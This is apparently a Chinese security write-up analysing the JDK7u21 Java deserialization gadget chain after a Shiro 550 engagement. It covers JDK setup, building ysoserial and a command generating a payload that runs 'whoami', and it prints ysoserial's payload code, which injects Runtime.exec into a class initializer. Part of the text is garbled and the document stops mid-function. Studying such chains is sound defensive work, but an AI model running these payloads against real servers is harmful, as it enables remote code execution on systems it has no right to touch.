# JDK7u21反序列化链利用分析
## 0x0 前言
起因来源于某次的真实的项目经历，碰到Shiro 550,当时尝试各种常见序列化链都失败了，最后JDK7u21
这个序列化链能够成功执行命令，所以对此进行一番学习。
## 0x1 前置知识
### 0x1.1 三大概念
学习JAVA相关内容内容之前，这三个经典概念都是可以回顾和学习。
**(1) JVM(Java Virtual Machine)**
> JVM(java虚拟机),是驻留于内存的抽象计算机。
>
> 1.1 主要构成:
>
> **类加载器: 将.class 文件加载到内存**
>
> **字节码验证工具: 检查代码中是否存在访问限制违规**
>
> **执行引擎: 将字节码转换为可执行的机器码**
>
> **JIT: 即时编译，用于提高JVM的性能，加快java程序的执行速度**
>
> 1.2 主要作用:
>
> 将java字节码(类文件.class,由JVM指令集,
> 符号表以及补充信息构成)解释为本地机器码(字节码映射本地机器码)，不同的操作系统使用不同的JVM映射规则，使java字节码的解释执行与操作系统无关，从而完成跨平台。
>
> **JAVA语言的跨平台性是基于JVM的不跨平台性的**
**(2) JRE(JAVA Runtime Environment)**
> JRE(java运行环境),由运行和管理JAVA应用程序的类库和工具组成。
>
> 单纯的JVM不能直接运行java程序，需要核心类库的支持,所以可以简单理解
>
> JRE = JVM + 核心类库 + 一些工具(密钥库工具keytool, jar文件解压缩工具...)
**(3) JDK(JAVA Development Kit)**
> java开发工具包，是面向JAVA开发人员使用的SDk(software Development Kit 软件开发工具包)
>
> 提供java程序的开发环境和运行环境。
>
> JDK 包含了 JRE、基础类库(Java
> API，如网络、IO、线程、模型)、java源码编译器javac、以及其他一些开发、诊断、分析、调试、管理的工具和命令，如jar、javah、jdb等
### 0x1.2 jdk命名规则
我们平时安装的java环境，大多是 Java SE Development Kit 8u261, 也就是所谓的jdk8,java8, jdk8。
为什么同一个东西，有这么多名称呢，其实这个跟jdk发布历史中改名有关。
1996-01-23 -1999-04-08 发行了 jdk1.0 - jdk1.1.8
1998-12-04 - 2003-0626 发行了 j2se 1.2 (jdk 1.2 开始了改名)
2004-09-30 发行了Java SE 5.0 (1.5.0) (jdk 1.5.0 又开始了改名)
..
Java SE 6.0 (1.6.0)
Java SE 7.0 (1.7.0)
...
Java SE 11.0
等
> ### Java命名方式更改的事件原因：
>
> 1998年12月8日，Sun公司发布了第二代Java平台（简称为Java2）的3个版本：J2ME（Java2 Micro
> Edition，Java2平台的微型版），应用于移动、无线及有限资源的环境；J2SE（Java 2 Standard Edition，Java
> 2平台的标准版），应用于桌面环境；J2EE（Java 2Enterprise Edition，Java
> 2平台的企业版），应用于基于Java的应用服务器。
>
> 2004年9月30日，J2SE1.5发布。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0）
>
> 2005年6月，Java SE
> 6正式发布。此时，Java的各种版本已经更名，已取消其中的数字2（如J2EE更名为JavaEE，J2SE更名为JavaSE，J2ME则为JavaME）
>
> java SE 主要应用于电脑上运行的软件】
>
> java ee 是基于se基础上构建，是开发企业级应用的一套APi(标准)，主要应用于网站建设。
>
> (其实我们平时用Spring 框架去开发 + tomcat 也可以的，根本不需要下载java ee的jdk)
>
> java se 主要应用于移动设备和嵌入式设备的java应用程序
java se ee me 他们所使用的jdk是一样的，区别的是，内置的类库存在差异。
## 0x2 调试环境搭建
这里简单介绍我平时的工作流，每个人的爱好都不一样。
**1.调试工具:**
ideal(调试)、eclipse(开发)
**2.安装JDK不同版本:**
MAC homebrew 只能直接安装官方最新版的OpenJDK
    最新版:
    brew install java
    jdk8以上:
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk8
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk9
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk10
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk11
    brew cask install AdoptOpenJDK/openjdk/adoptopenjdk12
    jdk7:
    brew cask install homebrew/cask-versions/zulu7
    jdk6:
    brew cask install homebrew/cask-versions/java6
    再低就没有必要了,毕竟都2020年.
查看系统已安装的java版本和路径:`/usr/libexec/java_home -V`
这样子虽然方便，但是我们依然选择不了自己想要的大版本中的小版本，这里的1.7.0272 已经超过了漏洞的版本，经过测试，没办法打成功的。
那么如何安装更详细的版本呢?
[java se
7所有小版本](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)
选择合适的操作系统下载，傻瓜化安装即可。
**3.下载**
`git clone https://github.com/frohoff/ysoserial`
编译:
    cd ysoserial
    mvn clean package -DskipTests
基本用法:
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  Jdk7u21 "whoami" > jdk7u21Object.ser
然后直接导入ideal中,下面我们直接在ideal进行ysoserial payload类的导入即可，这样子分析链也方便。
## 0x3 漏洞说明
### 0x3.1 背景说明
缺陷影响版本: JRE versions ()
                                  ...
                                    Runtime.exec()
     */
    @SuppressWarnings({ "rawtypes", "unchecked" })
    @PayloadTest ( precondition = "isApplicableJavaVersion")
    @Dependencies()
    @Authors({ Authors.FROHOFF })
    public class Jdk7u21 implements ObjectPayload {
        public Object getObject(final String command) throws Exception {
            final Object templates = Gadgets.createTemplatesImpl(command);
            String zeroHashCodeStr = "f5a5a608";
            HashMap map = new HashMap();
            map.put(zeroHashCodeStr, "foo");
            InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
            Reflections.setFieldValue(tempHandler, "type", Templates.class);
            Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
            LinkedHashSet set = new LinkedHashSet(); // maintain order
            set.add(templates);
            set.add(proxy);
            Reflections.setFieldValue(templates, "_auxClasses", null);
            Reflections.setFieldValue(templates, "_class", null);
            map.put(zeroHashCodeStr, templates); // swap in real object
            return set;
        }
可以看到payload不是很长，但是利用链中的调用还是比较多的，让我们来慢慢分析吧。
## 0x4 漏洞分析
### 0x4.1 第一层 createTemplatesImpl
别问我为什么这是第一层(payload都是层层嵌套的，这是第一句)
    public static  T createTemplatesImpl ( final String command, Class tplClass, Class abstTranslet, Class transFactory )
                throws Exception {
                // 建立一个templates 对象
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());